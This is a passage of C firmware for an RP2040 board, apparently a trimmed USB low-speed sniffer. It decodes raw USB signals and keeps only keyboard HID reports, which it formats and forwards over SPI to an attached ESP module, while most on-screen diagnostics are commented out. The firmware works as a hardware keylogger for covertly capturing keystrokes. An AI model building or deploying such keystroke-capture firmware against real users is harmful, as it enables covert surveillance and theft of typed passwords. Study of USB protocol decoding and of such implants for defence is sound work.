    if (g_capture_limit == CaptureLimit_100)
    {
        return 100;
    }
    else if (g_capture_limit == CaptureLimit_200)
    {
        return 200;
    }
    else if (g_capture_limit == CaptureLimit_500)
    {
        return 500;
    }
    else if (g_capture_limit == CaptureLimit_1000)
    {
        return 1000;
    }
    else if (g_capture_limit == CaptureLimit_2000)
    {
        return 2000;
    }
    else if (g_capture_limit == CaptureLimit_5000)
    {
        return 5000;
    }
    else if (g_capture_limit == CaptureLimit_10000)
    {
        return 10000;
    }
    else
    {
        return 100000;
    }
}

// Clear a buffer's metadata and re-arm its packet limit, ready to capture into.
static void reinit_dbuff(volatile dbuff_t *dbuff)
{
    memset((void *)&(dbuff->g_buffer_info), 0, sizeof(dbuff->g_buffer_info));
    dbuff->g_buffer_info.limit = capture_limit_value();
}

static void print_g_fold_count(int count)
{
    printf("   ... : Folded ");

    if (count == 1)
    {
        printf("1 frame");
    }
    else
    {
        printf("%d", count);
        printf(" frames");
    }

    printf("\r\n");
}

// Walk one decoded packet at g_display_ptr, advance the cursor to the next
// packet, apply the frame-folding display rules, and forward the interesting
// traffic (the payload of an IN transaction) to the ESP. Each decoded packet
// occupies: [header/flags word][time word][ceil(size/4) payload words].
// Returns false only if buffer corruption is suspected (stops the walk).
static bool print_packet(void)
{
    int flags = last_dbuff->g_buffer[g_display_ptr];    // status flags | byte size
    int time = last_dbuff->g_buffer[g_display_ptr + 1]; // packet timestamp
    int ftime = time - g_ref_time;                      // time relative to the chosen origin
    int delta = time - g_prev_time;                     // gap since the previous packet
    int size = flags & CAPTURE_SIZE_MASK;               // decoded length in bytes
    uint8_t *payload = (uint8_t *)&(last_dbuff->g_buffer[g_display_ptr + 2]);
    int pid = payload[1] & 0x0f;         // PID nibble (byte 0 is SYNC)
    static bool last_pid_in = false;     // did the previous packet start an IN?
    static uint8_t *last_payload = NULL; // payload of that IN token

    last_payload = (uint8_t *)&(last_dbuff->g_buffer[g_display_ptr + 2]);

    // A huge time gap almost always means the buffer indexing has slipped; bail.
    if (g_check_delta && delta > MAX_PACKET_DELTA)
    {
        printf("Time delta between packets is too large, possible buffer corruption.\r\n");
        return false;
    }

    // Advance to the next packet: 2 header words + ceil(size/4) payload words.
    g_display_ptr += (((size + 3) / 4) + 2);

    g_prev_time = time;
    g_check_delta = true;

    if (flags & CAPTURE_LS_SOF)
    {
        pid = Pid_Sof;
    }

    if ((g_display_time == DisplayTime_SOF && pid == Pid_Sof) || (g_display_time == DisplayTime_Previous))
    {
        g_ref_time = time;
    }

    // If we are inside a folded run of empty frames, swallow everything until a
    // non-foldable frame arrives. Empty frames (SOF + only IN/NAK) are collapsed
    // into a single "Folded N frames" summary instead of being printed one by one.
    if (g_folding)
    {
        if (pid != Pid_Sof)
        {
            return true; // skip the IN/NAK chatter inside the folded frame
        }

        if (flags & CAPTURE_MAY_FOLD)
        {
            g_fold_count++; // another empty frame in the run
            return true;
        }

        // print_g_fold_count(g_fold_count);
        g_folding = false; // this SOF starts a real frame: end the folded run
    }

    // Start folding when an empty frame is seen (and folding is enabled).
    if (flags & CAPTURE_MAY_FOLD && g_display_fold == DisplayFold_Enabled)
    {
        g_folding = true;
        g_fold_count = 1;
        return true;
    }

    // print_time(ftime);

    // Bus reset: never folded. Optionally re-base the time origin, and suppress
    // the delta check across the reset (time is discontinuous there).
    if (flags & CAPTURE_RESET)
    {
        // print_reset();

        if (g_display_time == DisplayTime_Reset)
        {
            g_ref_time = time;
        }

        g_check_delta = false;

        return true;
    }

    // Low-Speed keep-alive frame marker: nothing to forward.
    if (flags & CAPTURE_LS_SOF)
    {
        // print_ls_sof();
        return true;
    }

    // Errored packet: would be printed for diagnostics, but nothing is forwarded.
    if (flags & CAPTURE_ERROR_MASK)
    {
        // print_errors(flags, payload, size);
        return true;
    }

    // Forwarding logic: we are interested in the device's response to an IN.
    if (pid == Pid_In)
    {
        last_pid_in = true; // remember that this packet was an IN token
    }
    else
    {
        // An IN token immediately followed by an 8-byte DATA packet is the classic
        // Low-Speed HID report (e.g. a boot-protocol keyboard). size-4 strips the
        // SYNC+PID+CRC16 overhead, leaving the 8 report bytes. Format the report as
        // a text line and ship it to the ESP over SPI.
        if (last_pid_in && (pid == Pid_Data0 || pid == Pid_Data1 || pid == Pid_Data2) && size - 4 == 8)
        {
            int v = (last_payload[3] << 8) | last_payload[2];
            int addr = v & 0x7f;     // first report bytes reinterpreted as addr...
            int ep = (v >> 7) & 0xf; // ...and endpoint for the log line's tag

            char pkts[256] = {0};
            size_t sizepkt = sprintf(pkts, "IN: 0x%x/0x%x 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x;\r\n", addr, ep,
                                     last_payload[2], last_payload[3], last_payload[4], last_payload[5],
                                     last_payload[6], last_payload[7], last_payload[8], last_payload[9]);

            puts(pkts);

            my_spi_to_esp_write_blocking(pkts, sizepkt); // hand the report to the ESP
            total_packets_sended++;
        }

        last_pid_in = false;
    }

    return true;
}

// Iterate every decoded packet in last_dbuff, printing/forwarding each via
// print_packet(), then print a one-line summary (errors, resets, packets,
// frames, empty frames). Runs on core 1 after process_buffer() has decoded.
static void display_buffer(void)
{
    if (last_dbuff->g_buffer_info.count == 0)
    {
        printf("\r\nCapture buffer is empty\r\n");
        return;
    }

    printf("\r\nCapture buffer:\r\n");

    // Reset the display walk state and seed the time origin from the first packet.
    g_ref_time = last_dbuff->g_buffer[1];
    g_prev_time = last_dbuff->g_buffer[1];
    g_folding = false;
    g_check_delta = true;
    g_fold_count = 0;
    g_display_ptr = 0;

    for (int i = 0; i < last_dbuff->g_buffer_info.count; i++)
    {
        if (!print_packet())
        {
            break;
        }
    }

    if (g_folding && g_fold_count)
    {
        print_g_fold_count(g_fold_count);
    }

    printf("\r\n");
    printf("Total: ");
    printf("%d", last_dbuff->g_buffer_info.errors);
    printf(" error");
    printf(", ");
    printf("%d", last_dbuff->g_buffer_info.resets);
    printf(" bus reset");
    printf(", ");
    printf("%d", last_dbuff->g_buffer_info.count);
    printf(last_dbuff->g_buffer_info.fs ? " FS packet" : " LS packet");
    printf(", ");
    printf("%d", last_dbuff->g_buffer_info.frames);
    printf(" frame");
    printf(", ");
    printf("%d", last_dbuff->g_buffer_info.folded);
    printf(" empty frame");
    printf("\r\n\r\n");
}

// Running CRC-16 over data. Seed is 0xFFFF (per USB spec). The callers run this
// over payload + received CRC together: an intact DATA packet yields the fixed
// residual 0xB001, which is how the CRC is validated without splitting it out.
static uint16_t crc16_usb(uint8_t *data, int size)
{
    uint16_t crc = 0xffff;

    for (int i = 0; i < size; i++)
    {
        crc = crc16_usb_tab[(crc ^ data[i]) & 0xff] ^ (crc >> 8);
    }

    return crc;
}

// Running CRC-5 over data. Seed 0xFF (top bits unused for a 5-bit CRC). Run over
// the token's 11-bit field + received CRC5, an intact token yields residual 0x09.
static uint8_t crc5_usb(uint8_t *data, int size)
{
    uint8_t crc = 0xff;

    for (int i = 0; i < size; i++)
    {
        crc = crc5_usb_tab[(crc ^ data[i]) & 0xff] ^ (crc >> 8);
    }

    return crc;
}

// Error-indicator hook (e.g. an LED). Intentionally a no-op in this build.
static void set_error(bool error)
{
    return;
}

// Marks "empty" frames so the display can collapse them. A frame runs from one
// SOF (or LS keep-alive) to the next and is "empty" if it contains nothing but
// IN/NAK polling and no errors. Called once per decoded packet with its PID.
// g_sof_index remembers where the current frame's SOF header word lives so the
// CAPTURE_MAY_FOLD flag can be set on it retroactively once the frame ends.
static void handle_folding(int pid, uint32_t error)
{
    if (error)
    {
        last_dbuff->g_buffer_info.errors++;
        set_error(true);
    }

    if (pid == Pid_Sof)
    {
        last_dbuff->g_buffer_info.frames++;

        // If the frame that just ended stayed empty, flag its SOF as foldable.
        if (g_may_fold)
        {
            last_dbuff->g_buffer[g_sof_index] |= CAPTURE_MAY_FOLD;
            last_dbuff->g_buffer_info.folded++;
        }

        g_sof_index = g_wr_ptr - 2; // this SOF's header word
        g_may_fold = true;          // new frame starts out assumed empty
    }
    else if (pid != Pid_In && pid != Pid_Nak)
    {
        g_may_fold = false; // real traffic (anything but IN/NAK) -> not an empty frame
    }

    if (error)
    {
        g_may_fold = false; // an error anywhere in the frame disqualifies folding
    }
}

// Decode ONE captured packet: raw D+ samples (NRZI-encoded, bit-stuffed) in ->
// clean packet bytes out, plus error flags. This is the software half of the
// capture: the PIO only records line levels, everything below undoes the USB
// line coding and validates the result.
//
//   'size'    = number of raw sampled bits for this packet.
//   out_data  = &g_buffer[g_wr_ptr]: decoded bytes are written back into the same
//               buffer (in-place compaction; the decode cursor g_rd_ptr always
//               stays ahead of the write cursor g_wr_ptr).
//   'v'       = NRZI accumulator, seeded with a single top bit so the first
//               decoded bit has a defined "previous sample" reference that stays
//               continuous across 31-bit word boundaries.
static void process_packet(int size)
{
    // bit stuffing, NRZI....
    uint8_t *out_data = (uint8_t *)&(last_dbuff->g_buffer[g_wr_ptr]);
    uint32_t v = 0x80000000; // NRZI "previous sample" accumulator (see below)
    uint32_t error = 0;      // accumulated CAPTURE_ERROR_* flags
    int out_size = 0;        // decoded bytes produced so far
    int out_bit = 0;         // bit position within the byte being assembled
    int out_byte = 0;        // byte currently being assembled (LSB-first)
    int stuff_count = 0;     // consecutive 1s, for bit de-stuffing
    int pid, npid;

    // The raw samples arrive packed 31 bits per word (PIO autopush threshold).
    while (size)
    {
        uint32_t w = last_dbuff->g_buffer[g_rd_ptr++];
        int bit_count;

        if (size < 31)
        {
            w <<= (30 - size); // left-justify the final partial word into place
            bit_count = size;
        }
        else
        {
            bit_count = 31;
        }

        // NRZI transition map for the whole word in one step: (w ^ (w<<1)) sets a
        // bit wherever two adjacent samples DIFFER (a transition = an NRZI 0).
        // XOR-ing into v carries the phase across word boundaries.
        v ^= (w ^ (w << 1));

        for (int i = 0; i < bit_count; i++)
        {
            // Top bit of v now says transition (1) vs no-transition (0) for this
            // bit position. NRZI: transition => data 0, no transition => data 1.
            int bit = (v & 0x80000000) ? 0 : 1;

            v <<= 1; // advance to the next bit position

            // Bit de-stuffing: after six consecutive 1s the transmitter inserts a
            // forced 0. Drop it here. If it is instead a 1, that is seven 1s in a
            // row = a stuffing/line error.
            if (stuff_count == 6)
            {
                if (bit)
                {
                    error |= CAPTURE_ERROR_STUFF;
                }

                stuff_count = 0;
                continue; // discard the stuffed bit (do not emit it)
            }
            else if (bit)
            {
                stuff_count++; // another 1
            }
            else
            {
                stuff_count = 0; // a 0 resets the run
            }

            // Assemble surviving bits into bytes, LSB-first (USB bit order).
            out_byte |= (bit << out_bit);
            out_bit++;

            if (out_bit == 8)
            {
                out_data[out_size++] = out_byte;
                out_byte = 0;
                out_bit = 0;
            }
        }

        size -= bit_count;
    }

    // The packet must end on a whole byte; leftover bits mean a framing error.
    if (out_bit)
    {
        error |= CAPTURE_ERROR_NBIT;
    }

    if (out_size < 1)
    {
        error |= CAPTURE_ERROR_SIZE;
        return;
    }

    // Byte 0 must be the SYNC field. The SYNC (KJKJKJKK) decodes to 0x80, but at
    // Low Speed the inverted idle polarity shifts the reconstructed byte to 0x81.
    if (out_data[0] != (last_dbuff->g_buffer_info.fs ? 0x80 : 0x81))
    {
        error |= CAPTURE_ERROR_SYNC;
    }

    if (out_size < 2)
    {
        error |= CAPTURE_ERROR_SIZE;
        return;
    }

    // Byte 1 is the PID byte: low nibble = PID, high nibble = its complement.
    pid = out_data[1] & 0x0f;
    npid = (~out_data[1] >> 4) & 0x0f;

    // The two nibbles must be complementary, and PID 0 is reserved/illegal.
    if ((pid != npid) || (pid == Pid_Reserved))
    {
        error |= CAPTURE_ERROR_PID;
    }

    // Token / SOF / PING / SPLIT packets carry a 5-bit CRC. Check length first
    // (SPLIT is 5 bytes, the rest are 4: SYNC + PID + 2 payload/CRC bytes), then
    // run CRC5 over payload+CRC; an intact token leaves the residual 0x09.
    if (pid == Pid_Sof || pid == Pid_In || pid == Pid_Out || pid == Pid_Setup || pid == Pid_Ping || pid == Pid_Split)
    {
        if (((pid == Pid_Split) && (out_size != 5)) || ((pid != Pid_Split) && (out_size != 4)))
        {
            error |= CAPTURE_ERROR_SIZE;
        }
        else if (crc5_usb(&out_data[2], out_size - 2) != 0x09)
        {
            error |= CAPTURE_ERROR_CRC;
        }
    }
    // DATA packets carry a 16-bit CRC; an intact data packet leaves 0xB001.
    else if (pid == Pid_Data0 || pid == Pid_Data1 || pid == Pid_Data2 || pid == Pid_MData)
    {
        if (out_size < 4)
        {
            error |= CAPTURE_ERROR_SIZE;
        }
        else if (crc16_usb(&out_data[2], out_size - 2) != 0xb001)
        {
            error |= CAPTURE_ERROR_CRC;
        }
    }

    // Update frame-folding state for this PID/error.
    handle_folding(pid, error);

    // Write the packet header word back in place: error flags OR'ed with the byte
    // count, then advance the write cursor past this packet's ceil(size/4) words.
    last_dbuff->g_buffer[g_wr_ptr - 2] = error | out_size;
    g_wr_ptr += (out_size + 3) / 4;
}

// Reconstruct a packet's START time from its END time and its length in bits.
// A packet of N bits lasts N / (bit rate) microseconds: 12 bits/us at Full Speed,
// 1.5 bits/us at Low Speed. The magic multipliers are fixed-point reciprocals
// (x * k >> 16): 5461/65536 ~= 1/12, 43691/65536 ~= 1/1.5, avoiding a divide.
static uint32_t start_time(uint32_t end_time, uint32_t size)
{
    if (last_dbuff->g_buffer_info.fs)
    {
        return end_time - ((size * 5461) >> 16); // Divide by 12 (Full Speed)
    }
    else
    {
        return end_time - ((size * 43691) >> 16); // Divide by 1.5 (Low Speed)
    }
}

// Decode a whole capture buffer in place. Reads each raw entry (a SIZE word = bit
// count, plus a time word, plus the packed samples) and classifies it by its bit
// count: 0 = bus reset, 1 = Low-Speed keep-alive (frame mark), otherwise a real
// packet handed to process_packet(). Runs on core 1.
static void process_buffer(void)
{
    // Time origin: the start time of the very first entry.
    uint32_t time_offset = start_time(last_dbuff->g_buffer[1], last_dbuff->g_buffer[0]);
    int out_count = 0;

    // Reset decode cursors and per-buffer counters (read ahead, write behind).
    g_rd_ptr = 0;
    g_wr_ptr = 0;
    g_sof_index = 0;
    g_may_fold = false;

    last_dbuff->g_buffer_info.errors = 0;
    last_dbuff->g_buffer_info.resets = 0;
    last_dbuff->g_buffer_info.frames = 0;
    last_dbuff->g_buffer_info.folded = 0;

    for (int i = 0; i < last_dbuff->g_buffer_info.count; i++)
    {
        uint32_t size = last_dbuff->g_buffer[g_rd_ptr];                       // bit count
        uint32_t time = start_time(last_dbuff->g_buffer[g_rd_ptr + 1], size); // packet start time

        // A bit count above 16 bits is impossible for a real packet: the PIO fell
        // out of sync, usually because the speed setting is wrong.
        if (size > 0xffff)
        {
            printf("Synchronization error. Check your speed setting.\r\n");
            out_count = 0;
            break;
        }

        // Store the packet's start time (relative to the origin) in the header.
        last_dbuff->g_buffer[g_wr_ptr + 1] = time - time_offset;
        g_rd_ptr += 2;
        g_wr_ptr += 2;
        out_count++;

        if (size == 0)
        {
            // Bit count 0 = sustained SE0 = bus reset. Never folded.
            last_dbuff->g_buffer[g_wr_ptr - 2] = CAPTURE_RESET;
            handle_folding(-1, 0); // Prevent folding of resets
            last_dbuff->g_buffer_info.resets++;
        }
        else if (size == 1)
        {
            // A single captured bit is a keep-alive EOP. Full Speed has no such
            // thing (discard it); Low Speed uses it as the frame delimiter.
            if (last_dbuff->g_buffer_info.fs)
            {
                out_count--; // Discard the packet
                g_wr_ptr -= 2;
            }
            else
            {
                last_dbuff->g_buffer[g_wr_ptr - 2] = CAPTURE_LS_SOF;
                handle_folding(Pid_Sof, 0); // Fold on LS SOFs
            }

            g_rd_ptr++; // skip the trailing (empty) sample word
        }
        else
        {
            // A real packet. size counts one extra bit (the SOP reference), so
            // decode size-1 actual data bits.
            process_packet(size - 1);
            // The raw samples are packed 31 bits/word; when the packet ends within
            // one bit of a word boundary, skip the leftover partial word.
            if (size % 31 <= 1)
            {
                g_rd_ptr++;
            }
        }
    }

    last_dbuff->g_buffer_info.count = out_count;
}

// PIO IRQ handlers. The capture programs do not raise IRQs in normal operation,
// so these are diagnostic stubs that just report and clear any PIO interrupt.
void pio1_irq(void)
{
    printf("PIO1 IRQ!\r\n");
    if (pio1_hw->irq & 1)
    {
        printf("    IRQ 1 !\r\n");
        pio1_hw->irq = 1;
    }
    else if (pio1_hw->irq & 2)
    {
        printf("    IRQ 2 !\r\n");
        pio1_hw->irq = 2;
    }
}

void pio0_irq(void)
{
    printf("PIO0 IRQ!\r\n");
    if (pio0_hw->irq & 1)
    {
        printf("    IRQ 1 !\r\n");
        pio0_hw->irq = 1;
    }
    else if (pio0_hw->irq & 2)
    {
        printf("    IRQ 1 !\r\n");
        pio0_hw->irq = 2;
    }
}

static void free_all_pio_state_machines(PIO pio)
{
    for (int sm = 0; sm < 4; sm++)
    {
        if (pio_sm_is_claimed(pio, sm))
        {
            pio_sm_unclaim(pio, sm);
        }
    }
}

// Release both PIO blocks (unclaim all state machines and wipe their instruction
// memory) so the capture programs can be (re)loaded from a clean slate.
static void pio_destroy(void)
{
    free_all_pio_state_machines(pio0);
    free_all_pio_state_machines(pio1);
    pio_clear_instruction_memory(pio0);
    pio_clear_instruction_memory(pio1);
}

static dbuff_t *__attribute__((optimize("O0"))) GetLastDbuffAddr(void)
{
    return last_dbuff;
}

static void init_esp_seq(void)
{
    gpio_set_irq_enabled_with_callback(ESP_RESET_GPIO, GPIO_IRQ_EDGE_FALL, true, &gpio_callback);

    uart_init(uart0, UART_TO_ESP_BAUD_RATE);
    gpio_set_function(16, GPIO_FUNC_UART);
    gpio_set_function(17, GPIO_FUNC_UART);
    // UART 8N1: 1 start bit, 8 data bits, no parity bit, 1 stop bit
    uart_set_hw_flow(uart0, false, false);
    uart_set_format(uart0, DATA_BITS, STOP_BITS, PARITY);
    uart_set_fifo_enabled(uart0, false);
    uart_set_irq_enables(uart0, false, false);

    gpio_init(ELOG_SLAVEREADY_GPIO);
    gpio_set_dir(ELOG_SLAVEREADY_GPIO, GPIO_IN);
    gpio_pull_up(ELOG_SLAVEREADY_GPIO);

    for (int i = 0; i < 3000; i++)
    {
        if (gpio_get(ELOG_SLAVEREADY_GPIO))
        {
            printf("ESP slave not ready yet... %d\r\n", i);
        }
        else
        {
            puts("SLAVE READY!");
            break;
        }
        tight_loop_contents();
    }
    gpio_init(EBOOT_MASTERDATAREADY_GPIO);
    gpio_set_dir(EBOOT_MASTERDATAREADY_GPIO, GPIO_OUT);
    gpio_put(EBOOT_MASTERDATAREADY_GPIO, false);
}

// CORE 1 ENTRY POINT: the decode/forward worker. It waits for core 0 to hand
// over a full capture buffer through the inter-core FIFO, decodes it, and
// forwards results to the ESP, while core 0 keeps capturing into the other
// buffer. Between buffers it emits a periodic heartbeat/count over UART.
void core1_main()
{
    volatile dbuff_t *readed_last = NULL;

    init_esp_seq(); // bring up UART + SPI handshake to the ESP

    total_packets_sended = 0;
    unsigned int last_sended = 0;
    unsigned int g = 0;
    unsigned int z = 90000000 + 1;

    while (1)
    {
        static unsigned char line[32] = {0};

        if (multicore_fifo_rvalid())
        {
            // Core 0 pushed a filled buffer pointer. Take ownership, acknowledge
            // with a sentinel (0x69696969) so core 0 can proceed, then decode and
            // display/forward it.
            last_dbuff = (volatile dbuff_t *)(uintptr_t)multicore_fifo_pop_blocking();
            multicore_fifo_push_blocking(0x69696969);
            process_buffer();
            display_buffer();
        }
        else
        {
            if (last_sended != total_packets_sended && g++ > 20000000)
            {
                z = 0;
                g = 0;
                last_sended = total_packets_sended;
                sprintf(line, "HWv%s packets sended: 0x%x", hwver_name, total_packets_sended);
                uart_write_blocking(uart0, line, strlen(line) + 1);
                puts(line);
            }
            else if (z++ > 90000000)
            {
                z = 0;
                g = 0;
                sprintf(line, "HWv%s packets sended: 0x%x", hwver_name, total_packets_sended);
                uart_write_blocking(uart0, line, strlen(line) + 1);
                puts(line);
            }
        }
    }
}

static void init_seq(void)
{
    if (wait_20 == 0x69699696)
    {
        stdio_init_all();
        puts("\r\nwaiting 50 secs...\r\n");
        wait_20 = 0;
        sleep_ms(50000);
    }

    gpio_init(ESP_RESET_GPIO);
    gpio_set_dir(ESP_RESET_GPIO, GPIO_OUT);
    gpio_put(ESP_RESET_GPIO, false);

    gpio_init(EBOOT_MASTERDATAREADY_GPIO);
    gpio_set_dir(EBOOT_MASTERDATAREADY_GPIO, GPIO_IN);
    gpio_init(ELOG_SLAVEREADY_GPIO);
    gpio_set_dir(ELOG_SLAVEREADY_GPIO, GPIO_IN);

    gpio_init(USSEL_PIN);
    gpio_set_dir(USSEL_PIN, GPIO_OUT);
    gpio_put(USSEL_PIN, false);

    gpio_init(USOE_PIN);
    gpio_set_dir(USOE_PIN, GPIO_OUT);
    gpio_put(USOE_PIN, true);

    init_ver();

    // uart init must be called after init_ver(), because on devboard the same pins are used for UART
    stdio_init_all();

    gpio_put(USSEL_PIN, true);

    sleep_ms(100);

    printf("\r\nokhi USB started! Hardware v%s\r\nBuild Date %s %s\r\n", hwver_name, __DATE__, __TIME__);
    fflush(stdout);

    gpio_set_dir(ESP_RESET_GPIO, GPIO_IN);
    gpio_pull_up(ESP_RESET_GPIO);

    uint32_t baud __attribute__((unused)) = spi_init(SPI_ID, SPI_BAUD);
    gpio_set_function(SPI_SCK_PIN, GPIO_FUNC_SPI);
    gpio_set_function(SPI_MOSI_PIN, GPIO_FUNC_SPI);
    gpio_set_function(SPI_MISO_PIN, GPIO_FUNC_SPI);
    // The CS pin is controlled manually
    gpio_init(SPI_CS_PIN);
    gpio_set_dir(SPI_CS_PIN, GPIO_OUT);
    gpio_put(SPI_CS_PIN, true);
    // SPI mode 0: 8 data bits, MSB first, CPOL=0, CPHA=0
    spi_set_format(SPI_ID, 8, SPI_CPOL_0, SPI_CPHA_0, SPI_MSB_FIRST);
    printf("Firmware version: v%s\r\n", FIRMV_STR);
    printf("SPI Mode 0: %.2f MHz (%d)\r\n", ((float)baud) / 1000000.0, baud);

    printf("flash free space addr: 0x%08x\r\n"
           "flash end addr: 0x%08x\r\n"
           "flash free space size: 0x%08x bytes\r\n",
           get_start_free_flash_space_addr(), get_flash_end_address(), get_free_flash_space());

    gpio_put(USOE_PIN, false);

    pio_destroy();

    adc_init();
    adc_gpio_init(RP_ADC_GPIO);
    adc_select_input(1); // ADC1
    // 12-bit conversion, assume max value == ADC_VREF == 3.3 V
    const float conversion_factor = 3.3f / (1 << 12);
    uint16_t result = adc_read();
    printf("Raw value: 0x%03x, voltage: %f V\n", result, result * conversion_factor);
}

static bool bootsel_pressed_safely(void)
{
    const uint CS_INDEX = 1;
    uint32_t flags = save_and_disable_interrupts();

    hw_write_masked(&ioqspi_hw->io[CS_INDEX].ctrl, GPIO_OVERRIDE_LOW << IO_QSPI_GPIO_QSPI_SS_CTRL_OEOVER_LSB,
                    IO_QSPI_GPIO_QSPI_SS_CTRL_OEOVER_BITS);

    for (volatile int i = 0; i < 1000; ++i)
    {
        tight_loop_contents();
    }

    bool pressed = !(sio_hw->gpio_hi_in & (1u << CS_INDEX));

    hw_write_masked(&ioqspi_hw->io[CS_INDEX].ctrl, GPIO_OVERRIDE_NORMAL << IO_QSPI_GPIO_QSPI_SS_CTRL_OEOVER_LSB,
                    IO_QSPI_GPIO_QSPI_SS_CTRL_OEOVER_BITS);

    restore_interrupts(flags);

    return pressed;
}

static void boot_press(void)
{
    int x = 0;
    for (int i = 0; i < 500; i++)
    {
        if (bootsel_pressed_safely())
        {
            x++;
        }
    }

    if (x > 90)
    {
        /*
        printf("Bootsel pressed!\r\n");
        blink_led(5);
        */
        reset_usb_boot(0, 0);
    }
}

int main(void)
{
    boot_press();
    blink_led(2);

    /*
      Setting the RP clock to 120 MHz is crucial for USB sniffing.
      This clock speed ensures that the PIO (Programmable Input/Output)
      can accurately capture USB signals

      Using the default clock settings (125 MHz) can cause capture errors because the clock divider
      for the PIO is not an exact multiple for achieving the required 1.5 MHz USB low-speed clock.
    */
    bool success = set_sys_clock_khz(120000, true);

    init_seq();

    if (watchdog_caused_reboot())
    {
        printf("Watchdog caused reset!\r\n");
        blink_led(10);
    }

    if (success)
    {
        printf("Clock successfully set to 120 MHz\r\n");
    }
    else
    {
        printf("Failed to set the clock\r\n");
    }

    // GPIO for PIO CONF, DP & DM input, START output low
    gpio_init(START_INDEX);
    gpio_set_dir(START_INDEX, GPIO_OUT);
    gpio_put(START_INDEX, false);
    gpio_init(DP_INDEX);
    gpio_set_dir(DP_INDEX, GPIO_IN);
    gpio_init(DM_INDEX);
    gpio_set_dir(DM_INDEX, GPIO_IN);

    // This build supports USB LOW SPEED only (keyboards/mice), a trimmed-down
    // version of Alex Taradov's design.
    //
    // PIO0 and PIO1 run at 15 MHz. One PIO cycle = 1/15 MHz = 66.67 ns.
    // One USB low-speed bit  = 1/1.5 MHz = 666.67 ns.
    // So the PIO runs exactly 10x the USB low-speed bit rate = 10 PIO cycles per
    // captured bit, which the cycle-counted sampling loops in code.pio rely on.
    // With clk_sys = 120 MHz the divider is exactly 8.000 (integer, no jitter).

    float target_frequency_hz = 15000000.0f;
    float sys_clk_hz = (float)clock_get_hz(clk_sys);
    float div = sys_clk_hz / target_frequency_hz;

    printf("PIO clk div: %.2f - freq target: %.2f Mhz\r\n", div, target_frequency_hz / 1000000.0f);

    // Both PIO programs are always loaded at the same offset/order on every run,
    // to keep instruction addresses (e.g. the entry-point index 31) predictable.

    // ---- Configure PIO1: the SE0 START synchroniser (tar_pio1) --------------
    pio_gpio_init(pio1, START_INDEX);                     // hand the START pin to PIO
    pio_set_irq0_source_mask_enabled(pio1, 0x0F00, true); // enable PIO IRQ sources (debug)
    irq_set_exclusive_handler(PIO1_IRQ_0, pio1_irq);
    irq_set_enabled(PIO1_IRQ_0, true);
    int pio1_sm = pio_claim_unused_sm(pio1, true);
    uint offset_pio1 = pio_add_program(pio1, &tar_pio1_program);
    pio_sm_set_consecutive_pindirs(pio1, pio1_sm, START_INDEX, 1, true); // START = output
    pio_sm_set_consecutive_pindirs(pio1, pio1_sm, DP_INDEX, 2, false);   // D+, D- = inputs
    pio_sm_config c_pio1 = tar_pio1_program_get_default_config(offset_pio1);
    sm_config_set_set_pins(&c_pio1, START_INDEX, 1); // SET target = START
    sm_config_set_in_shift(&c_pio1, false, false, 0);
    sm_config_set_out_shift(&c_pio1, false, false, 0);
    sm_config_set_in_pins(&c_pio1, DP_INDEX); // IN base = D+ (so D-, START follow)
    sm_config_set_clkdiv(&c_pio1, div);       // same 15 MHz as PIO0
    pio_sm_init(pio1, pio1_sm, offset_pio1, &c_pio1);
    pio_sm_set_enabled(pio1, pio1_sm, false); // stay stopped until we start capture
    pio_sm_clear_fifos(pio1, pio1_sm);
    pio_sm_restart(pio1, pio1_sm);
    pio_sm_clkdiv_restart(pio1, pio1_sm);
    // pio_sm_exec(pio1, pio1_sm, pio_encode_jmp(offset_pio1)); // Start from the last PIO instruction

    // ---- Configure PIO0: the bit sampler (tar_lowsp_pio0) -------------------
    pio_set_irq0_source_mask_enabled(pio0, 0x0F00, true);
    irq_set_exclusive_handler(PIO0_IRQ_0, pio0_irq);
    irq_set_enabled(PIO0_IRQ_0, true);
    int pio0_sm = pio_claim_unused_sm(pio0, true);
    uint offset_pio0 = pio_add_program(pio0, &tar_lowsp_pio0_program);
    pio_sm_set_consecutive_pindirs(pio0, pio0_sm, DP_INDEX, 3, false); // D+, D-, START = inputs
    pio_sm_config c_pio0 = tar_lowsp_pio0_program_get_default_config(offset_pio0);
    sm_config_set_in_pins(&c_pio0, DP_INDEX);           // IN base = D+ (PIN0=D+, PIN1=D-, PIN2=START)
    sm_config_set_jmp_pin(&c_pio0, DP_INDEX);           // JMP PIN = D+ for LOW SPEED (would be DM_INDEX for FS)
    sm_config_set_in_shift(&c_pio0, false, true, 31);   // ISR: shift left, autopush every 31 bits
    sm_config_set_out_shift(&c_pio0, false, false, 32); // OSR: shift left, no autopull (used for the ::PINS trick)
    sm_config_set_fifo_join(&c_pio0, PIO_FIFO_JOIN_RX); // give all FIFO depth to RX (capture only)
    sm_config_set_clkdiv(&c_pio0, div);                 // 15 MHz
    pio_sm_init(pio0, pio0_sm, offset_pio0, &c_pio0);
    pio_sm_set_enabled(pio0, pio0_sm, false); // stay stopped until we start capture
    pio_sm_clear_fifos(pio0, pio0_sm);
    pio_sm_restart(pio0, pio0_sm);
    pio_sm_clkdiv_restart(pio0, pio0_sm);
    // pio_sm_exec(pio0, pio0_sm, pio_encode_jmp(31)); // Start from the last PIO instruction

    // 'index'  = next free slot for an incoming DATA word.
    // 'packet' = start slot (header) of the packet currently being received.
    int index = 0;
    int packet = 0;

    // Initialise the ping-pong double buffer and start capturing into dbuff1.
    last_dbuff = NULL;
    curr_dbuff = NULL;
    memset((void *)&dbuff1, 0, sizeof(dbuff1));
    memset((void *)&dbuff2, 0, sizeof(dbuff2));
    reinit_dbuff(&dbuff1);
    reinit_dbuff(&dbuff2);
    curr_dbuff = &dbuff1;

    printf("capture start!\r\n");

    // Start at slot 2: slots 0 and 1 are reserved for the first packet's SIZE and
    // TIME header words (data words land at 'index', header is written at 'packet').
    index = 2;
    packet = 0;
    curr_dbuff->g_buffer_info.count = 0;

    set_error(false);

    // Launch the core 1 decode worker (reset + relaunch to guarantee a clean start).
    sleep_ms(1000);
    multicore_launch_core1(core1_main);
    sleep_ms(1);
    multicore_reset_core1();
    multicore_launch_core1(core1_main);
    sleep_ms(1000);

    // If the capture loop ever stalls for >4 s, reboot.
    watchdog_enable(4000, 0);

    // Start capture. Park PIO0 at its entry point (index 31, the "wait for START"
    // instruction), enable it, re-assert the entry jump, and flush its FIFO. PIO0
    // now blocks on START. Finally enable PIO1: it debounces a clean SE0 and pulses
    // START, releasing PIO0 to begin sampling from a known bus state.
    pio_sm_exec(pio0, pio0_sm, pio_encode_jmp(31));
